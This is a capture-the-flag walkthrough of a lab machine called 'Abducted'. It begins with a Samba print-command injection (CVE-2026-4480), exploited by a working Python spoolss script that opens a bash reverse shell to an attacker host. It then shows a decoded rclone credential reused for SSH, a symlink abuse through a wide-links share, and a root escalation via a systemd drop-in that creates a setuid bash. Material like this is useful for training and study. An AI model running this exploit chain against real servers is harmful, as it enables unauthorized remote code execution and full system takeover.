### Nmap

```bash
sudo nmap -p- --open -vvv -n -Pn $target | tee nmap1.txt
```

```bash
sudo nmap -p$ports -sCV -Pn $target | tee nmap2.txt
```

```
PORT    STATE SERVICE     VERSION
22/tcp  open  ssh         OpenSSH 9.6p1 Ubuntu 3ubuntu13.16 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 0c:4b:d2:76:ab:10:06:92:05:dc:f7:55:94:7f:18:df (ECDSA)
|_  256 2d:6d:4a:4c:ee:2e:11:b6:c8:90:e6:83:e9:df:38:b0 (ED25519)
139/tcp open  netbios-ssn Samba smbd 4
445/tcp open  netbios-ssn Samba smbd 4
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required
|_nbstat: NetBIOS name: ABDUCTED, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
```

No web service. Only SSH and Samba. Ports 139 and 445 are the same service 139 is SMB over NetBIOS (legacy), 445 is SMB directly over TCP (SMB2/3, the one actually used in practice).

### SMB 

```bash
smbclient -L //10.129.31.250 -N
```

```
Sharename       Type      Comment
---------       ----      -------
HP-Reception    Printer   Reception printer
projects        Disk      Hartley Group Project Files
transfer        Disk      Staff file transfer
IPC$            IPC       IPC Service (Hartley Group Document Services)
```

Four shares: two disk shares, one printer, and IPC. The disk shares are the interesting ones. The printer (HP-Reception) accepts anonymous connections , already a signal.

### enum4linux-ng

```bash
python3 enum4linux-ng.py 10.129.31.250
```

Key findings from the output:

- User found: scott (Scott Mercer, UID 1000)
- Password policy minimum 5 characters, no complexity requirement, no lockout threshold → bruteforce candidate
- projects and transfer shares: mapping DENIED without credentials
- HP-Reception share: mapping OK --> anonymous access to the printer confirmed
- Guest access: server accepts any username with an empty password

```
'1000':
  username: scott
  name: Scott Mercer
  acb: '0x00000010'
```

## CVE-2026-4480 (Samba print command injection)

The HP-Reception printer is accessible without authentication. The Samba server is not patched to the May 2026 release that fixed several CVEs in one batch. Of that batch, the print command injection is the only one reachable from an unauthenticated position on this host, the others require an Active Directory domain controller, a WINS server, the vfs_worm module, or authenticated file operations, none of which this server presents. A guest-accessible printer share is exactly the precondition this CVE needs, and it's sitting right in the share list.

CVE-2026-4480 Samba executes the configured print command via system(), substituting macros directly into the string. %J becomes the job name as supplied by the client, and %s becomes the spool file path. The problem is that %J arrives from the client with almost no sanitization (only ' is replaced with _ ), so characters like |, ;, & reach the shell intact. A guest can submit print jobs, making this unauthenticated.

The vulnerability only applies when the backend uses printing = sysv. With cups or iprint the flow goes through the CUPS API and is safe.

### Why smbclient doesn't work

The first instinct is to use smbclient to submit the job, but that won't work: the legacy RAP interface that smbclient uses sanitizes shell metacharacters before they ever reach %J. We need to talk directly to the spooler RPC interface, which is exactly what the Samba Python bindings expose.

### Exploit

A print job over spoolss follows this sequence:

```
OpenPrinter --> StartDocPrinter (sets document_name = %J) --> StartPagePrinter --> WritePrinter (spool body = %s) --> EndPagePrinter --> EndDocPrinter (triggers the print command) --> ClosePrinter
```

With document_name = "|sh", the command Samba executes becomes:

```
/usr/local/bin/printaudit | sh <spoolfile>
```

The spool body is the script we want to run, with no character restrictions. The payload must run in the background with setsid ... & because EndDocPrinter is synchronous, a foreground reverse shell would block the process and time out.

```python
from samba.dcerpc import spoolss
from samba.param import LoadParm
from samba.credentials import Credentials
                    #     {HTB ip}     {your ip} {favorite port}
RHOST, LHOST, LPORT = "10.129.31.250", "TUN0_IP", 4444
DATA = ("setsid bash -c 'bash -i >& /dev/tcp/%s/%d 0>&1' >/dev/null 2>&1 &\n" % (LHOST, LPORT)).encode()

lp = LoadParm(); lp.load_default()
creds = Credentials(); creds.guess(lp); creds.set_anonymous()
iface = spoolss.spoolss(r"ncacn_np:%s[\pipe\spoolss]" % RHOST, lp, creds)
h = iface.OpenPrinter("\\\\%s\\HP-Reception" % RHOST, "", spoolss.DevmodeContainer(), 0x00000008)

i1 = spoolss.DocumentInfo1()
i1.document_name = "|sh"
i1.output_file = None
i1.datatype = "RAW"
ctr = spoolss.DocumentInfoCtr(); ctr.level = 1; ctr.info = i1

iface.StartDocPrinter(h, ctr)
iface.StartPagePrinter(h)
iface.WritePrinter(h, DATA, len(DATA))
iface.EndPagePrinter(h)
iface.EndDocPrinter(h)
iface.ClosePrinter(h)
print("[+] job submitted")
```

```bash
nc -lvnp 4444
python3 exploit.py
```

Shell as nobody (the print service account).


## nobody --> scott --> rclone credentials

Enumerating the filesystem, there's an offsite backup job under /opt/offsite-backup/ with a world-readable rclone config

```bash
cat /opt/offsite-backup/rclone.conf
```

```ini
[offsite]
type = sftp
host = backup.hartley-group.internal
user = svc-backup
pass = HZKAxfnMj-nLm59X9gpcC2ohjQL-WqVT6yRsNw
shell_type = unix
```

rclone doesn't encrypt stored passwords, it only "obscures" them with a reversible encoding. The tool itself can decode them:

```bash
rclone reveal HZKAxfnMj-nLm59X9gpcC2ohjQL-WqVT6yRsNw
# iXzvcib3SrpZ
```

The password was reused for the scott system account:

```bash
ssh scott@10.129.31.250
# password: iXzvcib3SrpZ
```

```
scott@abducted:~$ id
uid=1000(scott) gid=1001(scott) groups=1001(scott)
```

User flag at /home/scott/user.txt
## scott --> marcus 

Reading the Samba configuration:

```bash
cat /etc/samba/shares.conf
```

```ini
[transfer]
    comment = Staff file transfer
    path = /srv/transfer
    valid users = scott
    force user = marcus
    read only = no
    wide links = yes
    browseable = yes
```

```bash
grep -E 'unix extensions|wide links' /etc/samba/smb.conf
# unix extensions = no
# allow insecure wide links = yes
```

Two dangerous settings combined:

- force user = marcus: every file operation through this share runs as marcus, regardless of who authenticated.
- wide links = yes + allow insecure wide links = yes + unix extensions = no: Samba follows symlinks that point outside the share tree. Normally wide links is disabled when unix extensions is active, but allow insecure wide links overrides that protection.

scott owns /srv/transfer on disk. The plan is create a symlink inside the share pointing to marcus's home directory, connect to the share authenticated as scott, and write an SSH key through the symlink. Because of force user = marcus, the file is created and owned by marcus.

```bash
# Generate SSH key
ssh-keygen -q -t ed25519 -N '' -f /tmp/k

# Create symlink in the share → marcus's home
ln -s /home/marcus /srv/transfer/mh

# Write authorized_keys through the symlink (Samba follows it and writes as marcus)
smbclient //127.0.0.1/transfer -U 'scott%iXzvcib3SrpZ' \
    -c 'mkdir mh/.ssh; put /tmp/k.pub mh/.ssh/authorized_keys'
```

```bash
ssh -i /tmp/k marcus@10.129.31.250
```

```
marcus@abducted:~$ id
uid=1001(marcus) gid=1002(marcus) groups=1002(marcus),1000(operators)
```

## marcus --> root

marcus belongs to the operators group. Checking what that group can access:

```bash
ls -ld /etc/systemd/system/smbd.service.d
# drwxrws--- 2 root operators 4096 ... /etc/systemd/system/smbd.service.d
```

The smbd.service drop-in directory is group-writable by operators (setgid bit: files created inside inherit the group). Any " * .conf" file placed there gets merged into smbd.service on daemon reload, and directives like ExecStartPre= run before the main process. smbd runs as root, so this is arbitrary command execution as root at service start.

The remaining question is if marcus can reload and restart the service? Checking polkit delegations

```bash
for action in $(pkaction); do
    pkcheck --action-id "$action" --process $$ 2>/dev/null && echo "ALLOWED: $action"
done
```

Relevant results

```
ALLOWED: org.freedesktop.systemd1.reload-daemon
```

And conditionally, when the call carries unit=smbd.service (as systemctl sends it)

```
org.freedesktop.systemd1.manage-units → allowed only for smbd.service
```

So marcus can run systemctl daemon-reload and systemctl restart smbd without a password.

Combining both primitives: write a drop-in that copies bash with the setuid root bit, then reload and restart the service to trigger it.

```bash
cat > /etc/systemd/system/smbd.service.d/override.conf <<'EOF'
[Service]
ExecStartPre=/bin/cp /bin/bash /tmp/.rb
ExecStartPre=/bin/chmod 4755 /tmp/.rb
EOF

systemctl daemon-reload
systemctl restart smbd
```

```bash
ls -l /tmp/.rb
# -rwsr-xr-x 1 root root 1446024 ... /tmp/.rb

/tmp/.rb -p -c 'id; cat /root/root.txt'
# uid=1001(marcus) gid=1002(marcus) euid=0(root) groups=1002(marcus),1000(operators)
```

Root flag at /root/root.txt